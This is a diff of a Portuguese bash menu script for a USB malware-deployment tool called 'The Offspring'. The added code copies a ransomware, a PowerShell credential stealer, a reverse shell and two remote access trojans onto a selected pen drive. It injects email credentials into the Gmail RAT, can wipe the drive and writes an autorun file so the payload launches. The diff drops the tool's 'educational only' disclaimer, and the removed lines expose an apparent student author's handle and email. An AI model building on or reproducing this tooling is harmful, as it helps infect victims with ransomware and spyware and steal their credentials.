@@ -2,12 +2,17 @@
 
 readonly OFSPRING_FILE="/root/.f/offspring.txt"
 readonly LICENSE_FILE="/root/.f/licenca.txt"
-readonly SRC_DIR="/source/USB-Ransom"
+readonly USB_RANSOM_SRC_DIR="/source/USB-Ransom"
+readonly RAT_SRC_DIR="/source/RATmail"
+readonly REVERSE_DIR="/source/reverse"
+readonly RATSERVER="/source/RAT"
 readonly MEDIA_DIR="/media/newland"
 readonly MENU_PROMPT="off> "
 readonly MENU_BACK_OPTION="menu"
 readonly MENU_EXIT_OPTION="sair"
 readonly ONE_PROMPT="off/usb> "
+readonly TXT="/root/.f/01.txt"
+readonly POWERSHELL_STEALER="/source/stealer"
 
 print_file_content() {
     clear
@@ -15,44 +20,16 @@ print_file_content() {
 }
 
 print_welcome_message() {
-echo""
-echo""
-echo""
-echo""
-    echo "		============================================="
-    echo "		|Bem-vindo ao The Offspring		    |"
-    echo "		|O The Offspring é uma ferramenta de        | "
-    echo "		|malwares que cria trojans e executavéis    |"
-    echo "		|binários do MS-DOS que são colocados em    |"   
-    echo "		|dispositivos de armazenamento USB pen-drive|"
-    echo "		|que são compilados quando inseridos.	    |"
-    echo "		============================================="
-    echo "		|O The Offspring permite automatizar a confi|"
-    echo "		|guração de malwares e pré-compilar arquivos|"
-    echo "		|necessários, além de automatizar o processo|"
-    echo "		|de mover os arquivos.			    |"
-    echo "		============================================="
-    echo ""
-    echo ""
-    echo "		---------------------------------------------"
-    echo "		Essa ferramenta é somente para fins educacionais."
-    echo "		O autor não é responsavél pelo que você faz com"
-    echo "		essa ferramenta."
-    echo "		--------------------------------------------"
-    echo "		Desenvolvido por: @gb.mps7 (Instagram)"
-    echo "		gabriel.mpsouza@aluno.educacao.pe.gov.br"
-    echo ""
+    zsh welcome.sh
 }
 
 print_menu() {
     cat <<EOF
-	Menu:
+    Menu:
 
-	1) Ferramentas de Flash-USB
-	2) Sobre o OFFSPRING
-	3) Licença
+    1) Ferramentas de Flash-USB;
 
-	99) Sair
+    99) Sair
 
 EOF
 }
@@ -60,64 +37,85 @@ EOF
 print_modules_menu() {
     cat <<EOF
 
-	Escolha uma opção
-	para automatizar:
+    Escolha uma opção
+    para automatizar:
 
-	1) USB-RansomWare
-	2) Ladrão de Credenciais Powershell
-	3) Conexão TCP Powershell
+    1) USB-RansomWare;
+    2) Ladrão de Credenciais Powershell;
+    3) Powershell reverso;
+    4) Remote Acess Trojan via G-Mail;
+    5) Remote Acess Trojan via Servidor;
 
-	99) Voltar
+    99) Voltar
 
 EOF
     read -p "$ONE_PROMPT" option_module
 }
 
 copy_content_to_pendrive() {
+    clear
+    echo -e "\n$(cat "$OFSPRING_FILE")"
+    cat /source/"$option_module".txt
     listar_pendrives
+    echo ""
+    read -p "off/usb/rat> " pendrive_number
 
-    read -p "$ONE_PROMPT" pendrive_number
-
-    if [ "$pendrive_number" -ge 0 ] && [ "$pendrive_number" -lt "${#pendrives[@]}" ]; then
+    if (( pendrive_number >= 0 )) && (( pendrive_number < ${#pendrives[@]} )); then
         selected_pendrive="$MEDIA_DIR/$(basename "${pendrives[$pendrive_number]}")"
 
         if [ -d "$selected_pendrive" ]; then
-            echo ""
             read -p "Deseja apagar os arquivos pré-existentes em $selected_pendrive? (sim/não): " delete_existing_files
 
             if [ "$delete_existing_files" = "sim" ]; then
                 rm -r "$selected_pendrive"/*
-                echo ""
-                echo "Arquivos pré-existentes apagados em $selected_pendrive"
+                echo -e "[#] Arquivos pré-existentes apagados em $selected_pendrive\n"
             fi
 
-            cp -r "$SRC_DIR"/* "$selected_pendrive"
-            echo ""
-            echo "Conteúdo copiado para $selected_pendrive"
-            echo ""
+            case $option_module in
+                1) cp -r "$USB_RANSOM_SRC_DIR"/* "$selected_pendrive" ;;
+		2) cp -r "$POWERSHELL_STEALER"/* "$selected_pendrive"
+		   echo "[#] O Script Powershell foi ativado."
+		   ;;
+		3) cp -r "$REVERSE_DIR"/* "$selected_pendrive"
+                    echo -n -e "[#] O Trojan ficará acessível pela internet."
+                    echo -e "\n[#] Acesse o Endereço IP interno da vítima para ter controle."
+                    echo -e "[#] Para a vítima, ele ficará acessível em http://127.0.0.1:80"
+		    ;;
+                4)
+                    cp -r "$RAT_SRC_DIR"/* "$selected_pendrive"
+                    echo -e "\$username=$(read -p "Insira o e-mail que será utilizado para enviar mensagens: " email; echo $email)" >> "$selected_pendrive"/Mail.ps1
+                    echo -e "\$password=$(read -p "Insira a senha do e-mail: " senha; echo $senha)" >> "$selected_pendrive"/Mail.ps1
+                    echo -e "\$msg.To.Add=$(read -p "Insira o e-mail que as fotos devem ser enviadas: " remetente; echo $remetente)" >> "$selected_pendrive"/Mail.ps1
+                    ;;
+                5)
+                    cp -r "$RATSERVER"/* "$selected_pendrive"
+                    echo -n -e "[#] O Trojan ficará acessível pela internet."
+                    echo -e "\n[#] Acesse o Endereço IP interno da vítima para ter controle."
+                    echo -e "[#] Para a vítima, ele ficará acessível em http://127.0.0.1:80"
+                    ;;
+                *)
+                    echo "Opção inválida"
+                    ;;
+            esac
+
+            echo -e "[#] Conteúdo copiado para $selected_pendrive\n"
             read -p "Deseja criar um arquivo autorun.info? (sim/não): " create_autorun
 
             if [ "$create_autorun" = "sim" ]; then
-                echo ""
+                echo -e ""
                 read -p "Digite o nome do arquivo principal: " main_file_name
-                echo ""
-                echo "OPEN=$main_file_name" > "$selected_pendrive/autorun.info"
-                echo "Arquivo autorun.info criado em $selected_pendrive"
+                echo -e "OPEN=$main_file_name" > "$selected_pendrive/autorun.info"
+                echo -e "[#] Arquivo autorun.info criado em $selected_pendrive"
             fi
-                echo ""
+
             read -p "Deseja voltar ao menu principal ou sair? ($MENU_BACK_OPTION/$MENU_EXIT_OPTION): " back_option
             case $back_option in
-                "$MENU_BACK_OPTION")
-                    return
-                    ;;
+                "$MENU_BACK_OPTION") return ;;
                 "$MENU_EXIT_OPTION")
                     echo "Saindo..."
                     exit 0
                     ;;
-                *)
-                    echo "Opção inválida, retornando ao menu principal."
-                    return
-                    ;;
+                *) echo "Opção inválida, retornando ao menu principal." ;;
             esac
         else
             echo "Pendrive inválido"
@@ -128,9 +126,8 @@ copy_content_to_pendrive() {
 }
 
 listar_pendrives() {
-    echo ""
-    echo "  Selecione um pendrive:"
-    echo  ""
+    echo -e "\n  Selecione um pendrive:"
+    echo -e "\n"
     pendrives=("$MEDIA_DIR/"*)
 
     if [ ${#pendrives[@]} -eq 0 ]; then
@@ -139,9 +136,8 @@ listar_pendrives() {
     fi
 
     for i in "${!pendrives[@]}"; do
-        echo "	$i) $(basename "${pendrives[$i]}")"
+        echo -e "\t$i) $(basename "${pendrives[$i]}")"
     done
-    echo ""
 }
 
 while true; do
@@ -155,30 +151,15 @@ while true; do
         1)
             print_modules_menu
             case $option_module in
-                1)
-                    copy_content_to_pendrive
-                    ;;
-                99)
-                    ;;
-                *)
-                    echo "Opção inválida"
-                    ;;
+                1 | 2 | 3 | 4 | 5) copy_content_to_pendrive ;;
+                99) ;;
+                *) echo "Opção inválida" ;;
             esac
-            ;;
-        2)
-            clear
-            cat "$OFSPRING_FILE"
-            ;;
-        3)
-            clear
-            cat "$LICENSE_FILE"
             ;;
         99)
             echo "Saindo..."
             exit 0
             ;;
-        *)
-            echo "Opção inválida"
-            ;;
+        *) echo "Opção inválida" ;;
     esac
 done
